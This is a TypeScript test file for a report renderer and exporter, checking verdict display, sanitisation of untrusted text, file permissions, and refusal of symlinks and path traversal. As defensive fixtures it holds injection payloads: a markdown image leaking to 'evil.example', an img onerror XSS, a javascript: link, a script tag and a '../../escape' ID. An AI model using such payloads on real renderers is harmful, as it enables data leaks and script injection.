import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, readFileSync, rmSync, statSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { exportReport, renderReport } from "../src/report.ts";
import { Ledger, VERDICT } from "./helpers.ts";

test("report distinguishes incomplete research from a saved verdict", () => {
  const l = new Ledger(); l.start(); assert.match(renderReport(l.state().mission!), /No verdict/);
  l.evidence(); l.op({ op: "verdict", verdict: VERDICT });
  const report = renderReport(l.state().mission!);
  assert.match(report, /Disposition:\*\* conclusive/); assert.match(report, /\[E1\]\(#e1\)/); assert.match(report, /Provenance limits/);
});
test("untrusted text cannot inject images, links or HTML into the report", () => {
  const l = new Ledger(); l.start({ mode: "mixed" });
  l.evidence({ title: "![x](https://evil.example/?leak=1) <img src=x onerror=alert(1)>", summary: "[click](javascript:alert(1)) https://evil.example/a" });
  l.op({ op: "run", run: { label: "<script>x</script>", hypothesis: "h", receiptId: l.receipt({ metrics: { ms: 3 }, asi: { note: "![i](http://e/x)" } }).id, primaryMetric: "ms", direction: "lower" } });
  const report = renderReport(l.state().mission!);
  for (const raw of ["![x](", "[click](", "https://evil", "<script>", "![i]("]) assert.ok(!report.includes(raw), raw);
  assert.doesNotMatch(report, /(?<!\\)<(img|script)/);
  assert.match(report, /### Segment 0: Mission start/); assert.match(report, /Baseline: R1/);
});
test("exports three readable files without overwriting existing reports", () => {
  const dir = mkdtempSync(join(tmpdir(), "omp-export-test-"));
  try {
    const l = new Ledger(); l.start(); l.evidence(); const a = exportReport(l.state(), dir); const b = exportReport(l.state(), dir);
    assert.notEqual(a.directory, b.directory); assert.equal(a.files.length, 3);
    assert.equal(JSON.parse(readFileSync(join(a.directory, "mission.json"), "utf8")).evidence.length, 1);
    assert.equal(readFileSync(join(a.directory, "ledger.jsonl"), "utf8").trim().split("\n").length, l.entries.length);
    if (process.platform !== "win32") assert.equal(statSync(a.files[0]!).mode & 0o777, 0o600);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});
test("export refuses symlinked parent directories", { skip: process.platform === "win32" }, () => {
  const dir = mkdtempSync(join(tmpdir(), "omp-export-links-"));
  try {
    mkdirSync(join(dir, "outside")); symlinkSync(join(dir, "outside"), join(dir, ".omp"), "dir");
    const l = new Ledger(); l.start(); assert.throws(() => exportReport(l.state(), dir), /symlink/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});
test("export refuses a manipulated mission path", () => {
  const dir = mkdtempSync(join(tmpdir(), "omp-export-traversal-"));
  try {
    const l = new Ledger(); l.start(); const state = l.state(); state.mission!.id = "../../escape";
    assert.throws(() => exportReport(state, dir), /Invalid mission ID/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});
